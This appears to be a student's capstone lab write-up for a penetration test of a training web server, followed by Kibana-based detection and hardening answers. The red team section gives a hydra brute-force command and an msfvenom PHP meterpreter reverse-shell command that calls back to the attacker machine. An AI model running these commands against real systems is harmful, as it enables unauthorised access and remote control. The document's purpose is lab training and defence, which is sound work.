@@ -1,0 +1,100 @@
+Link to Google Doc presentation: https://docs.google.com/presentation/d/1TYhL4Sd7rlbLo22gJ1i1mDnzMZvo47_qRd-tzRL2rnA/edit?usp=sharing
+
+Below are notes and screenshots taken during the process. Actual presentation is linked above.
+RED TEAM:
+
+Setting up filebeat, metricbeat and packetbeat on target machine (capstone). 
+
+Capstone (target) IP: 192.168.1.105  - Discovered via “ifconfig” while in the capstone box, not via the kali box. AWAITING HINTS FROM INSTRUCTOR TO SEE IF I WAS SUPPOSED TO DO I THIS WAY. 
+
+Using ifconfig on kali box then running basic nmap scan against the subnet resulted in what ports are open: 
+
+
+Port 80 open on 192.168.1.105 - Good starting point. 
+
+Navigating to target IP/login:
+
+Server is running Apache2.4.29: 
+
+
+
+Navigating around the site, I see there is a secret_folder that I would like to look at: 
+
+Accessing secret_file requires a username and password:
+
+
+
+Dirb http://192.168.1.105   - 
+
+Prepare the word list - 
+
+Then run brute force for password (hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder)- 
+
+Inside the secret_folder - 
+
+At this point, I need to get the webdav user/pw. I ran the rockyou wordlist against webdav username. This ran for a good little while, so I killed it and searched for ryan’s password next. ***NOTE**** DUE TO THIS MISSTEP OF RUNNING HYDRA AGAINST ROCKYOU WORDLIST FOR THE OTHER USERS, I ENDED UP WITH MANY MORE RECORDS IN MY KIBANA LOGS. THE PROVIDED SOLUTIONS SHOW MANY FEWER EVENTS AND CONFUSED ME ON DAY2 ACTIVITY.
+
+Then after reading the instructions, I killed that attempt and am now breaking the hash using crackstation and getting access to the passwd.dav - 
+
+
+SSH is successful - 
+
+Created the php shell script (msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php) and placed it in webdav - 
+
+Executed the php shell script and meterpreter picked it up - 
+
+Couple of “ls” and “cd ../” later, I found flag.txt and used “cat” to find result! - 
+
+b1ng0w@5h1sn@m0
+
+
+
+BLUE TEAM:
+
+Verify docker is running on ELK stack - 
+
+Logged into Kibana and ensure that Apache log was successfully received - 
+
+
+Ensure that system logs were pulled into Kibana - 
+
+Apache Metrics received - 
+
+And System Metrics too - 
+
+Dashboard created with suggested reports - 
+
+
+Identify the offensive traffic.
+Identify the traffic between your machine and the web machine:
+When did the interaction occur? Attacker ip 192.168.1.90 was logged having 279693 transactions with the target server on 02-02-2022 starting at 1AM. Used source.ip: 192.168.1.90 and destination.ip: 192.168.1.105 and url.path: /company_folders/secret_folder/ 
+What responses did the victim send back? The vast majority of responses were 400 codes, specifically Unauthorized 401 responses with a few 404 not found. There were just over 1500 successful interactions with 200 status codes as well as a few 207 status code for multiple independent processes which is used by WebDav. 
+What data is concerning from the Blue Team perspective? The most concerning part is the successful access and WebDav access. Whenever there is a spike in connections over time there should be cause for concern. 
+Find the request for the hidden directory.
+In your attack, you found a secret folder. Let's look at that interaction between these two machines.
+How many requests were made to this directory? At what time and from which IP address(es)? There were either 194,722 or 137,509 requests made to the secret_folder directory. I only see the attacker IP in these requests (when I remove the search parameter for ip, roughly the same numbers show up
+Which files were requested? What information did they contain? 2 times, the connect_to_corp_server file was accessed. This file contains the hashed version for CEO password as well as instructions on connecting to the fileshare on corp server. 
+What kind of alarm would you set to detect this behavior in the future? I do not think it would be out of question to create an alert for any time these secret files are being accessed. The only person who should be doing so is Ashton and even then, once she has the process down, she doesn't need the instructions every time. 
+Identify at least one way to harden the vulnerable machine that would mitigate this attack. Update the webserver application. Apache has newer updates that prevent a lot of these shell vulnerabilities. Do not leave detailed instructions and passwords (even hashed) in public facing servers. Update the website and obscure the file structure better; these old websites are rife with vulnerabilities.
+Identify the brute force attack.
+After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:
+Can you identify packets specifically from Hydra? I determined the hydra attack by filtering for the unauthorized responses from secret_folder access attempts. The massive spike in unauthorized attempts can indicate a brute force attack. We can also find the hydra under user_agent.original.  
+
+How many requests were made in the brute-force attack? Per my logs, there were 194,678 requests to the secret_folder directory during the attack
+How many requests had the attacker made before discovering the correct password in this one? There were 194,722 total requests and 194,678 got the unauthorized, leaving 44 successful attempts. 
+What kind of alarm would you set to detect this behavior in the future and at what threshold(s)? Could set an alarm to alert if 401 Unauthorized is returned from server. Setting a reasonable threshold would prevent false alarms for password issues. 
+Identify at least one way to harden the vulnerable machine that would mitigate this attack. If alert for 401 unauthorized triggers, the server can automatically drop traffic from the ip who is running the attempts. Could send notice to end user about the lockout as well. With Soar technology, we can have automated text messages go out to accounts who are displaying odd behavior to cut down on lockout periods and security personnel hours. 
+Find the WebDav connection.
+Use your dashboard to answer the following questions:
+How many requests were made to this directory? In the Top 10 HTTP requests [packetbeat] ECS panel, we can see the webdav folder was directly connected and files inside were accessed. 
+Which file(s) were requested? shell.php
+What kind of alarm would you set to detect such access in the future? Create an alarm anytime this directory is accessed by a machine OTHER than the machine that should have access.
+Identify at least one way to harden the vulnerable machine that would mitigate this attack. Connections to the shared folder should not be accessible from the web.
+Restrict access to the machine via firewall. Only approved machines should be able to access and change directory.
+Identify the reverse shell and meterpreter traffic.
+To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:
+Can you identify traffic from the meterpreter session? We can see the shell.php file in webdav directory in dashboard 
+What kinds of alarms would you set to detect this behavior in the future? Set alert for port 4444 traffic and set alert for .php being uploaded to server.
+Identify at least one way to harden the vulnerable machine that would mitigate this attack.  Remove ability to upload files to directory over the web. 
+
+
